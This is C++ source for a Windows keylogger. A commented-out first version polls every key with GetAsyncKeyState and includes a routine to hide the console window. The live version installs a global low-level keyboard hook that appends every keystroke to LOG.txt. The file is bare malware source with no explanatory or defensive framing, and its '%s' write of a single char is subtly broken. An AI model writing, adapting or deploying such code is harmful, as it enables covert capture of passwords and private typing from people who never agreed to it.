// #include <iostream>
//#include <stdlib.h>
//#include <windows.h>
//
//using namespace std;
//
//// ------------------------------------------------------------------------------------------
//void HideConsole()
//{
//	// Handle to a window - part of win32 api
//	HWND handle;
//	AllocConsole();	 // Initializes standard input, standard output, and standard error handles for the new console
//	handle = FindWindowA("ConsoleWindowClass", NULL);
//	ShowWindow(handle, 0);
//}
//
//
//// ------------------------------------------------------------------------------------------
//#pragma warning (disable : 4996)
//int Save(int _key, const char* file)
//{
//	/*if ((_key == i) || (_key == 2))
//	{
//		return 0;
//	}*/
//
//	cout << _key << endl;
//
//	FILE* outputFile;
//	outputFile = fopen(file, "a+");
//
//
//	// Special Keys
//	switch (_key)
//	{
//      	//case 8: fprintf(outputFile, "[BACKSPACE]"); break;
//		default: fprintf(outputFile, "%s", &_key);
//	}
//	
//	fclose(outputFile);
//
//	return 0;
//}
//// ------------------------------------------------------------------------------------------
//
//
//int main()
//{
//	//HideConsole();
//	char i;
//
//	while (true)
//	{
//		for (i=8; i <= 255; i++)
//		{
//			if (GetAsyncKeyState(i) == -32767) 	// -32767 means the button is pressed    // Constantly looping all the keys and if the key is pressed the value is -32767 
//			{
//				Save(i,"LOG.txt");
//			}
//		}
//	}
//
//
//	cin.get();
//	return 0;
//}
//// ------------------------------------------------------------------------------------------
//

    






// --------------------------------------------------------------------------------------------------------------



#define _WIN32_WINNT 0x0500
#include<Windows.h>
#include<stdio.h>

using namespace std;
 
HHOOK hHock = NULL;
const char* file = "LOG.txt";

#pragma warning (disable : 4996)
void SaveKey(char key)
{
    FILE* outputFile;      
    outputFile = fopen(file, "a+");
    fprintf(outputFile, "%s", &key);
    fclose(outputFile);
}





#pragma warning (disable : 4996)
LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
{
  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        switch (p->vkCode) {

            // Invisible keys
        //case VK_CAPITAL:	out << "<CAPLOCK>";		break;
        //case VK_SHIFT:		out << "<SHIFT>";		break;
        //case VK_LCONTROL:	out << "<LCTRL>";		break;
        //case VK_RCONTROL:	out << "<RCTRL>";		break;
        //case VK_INSERT:		out << "<INSERT>";		break;
        //case VK_END:		out << "<END>";			break;
        //case VK_PRINT:		out << "<PRINT>";		break;
        //case VK_DELETE:		out << "<DEL>";			break;
        //case VK_BACK:		out << "<BK>";			break;

        //case VK_LEFT:		out << "<LEFT>";		break;
        //case VK_RIGHT:		out << "<RIGHT>";		break;
        //case VK_UP:			out << "<UP>";			break;
        //case VK_DOWN:		out << "<DOWN>";		break;

         // Visible keys
        default:
            SaveKey(char(p->vkCode));
            
        }  
    }

    return CallNextHookEx(hHock, nCode, wParam, lParam);
}



int main()
{
    MSG msg;
    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelHook, NULL, NULL);   // for mouse WH_MOUSE_LL

    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHock);
}


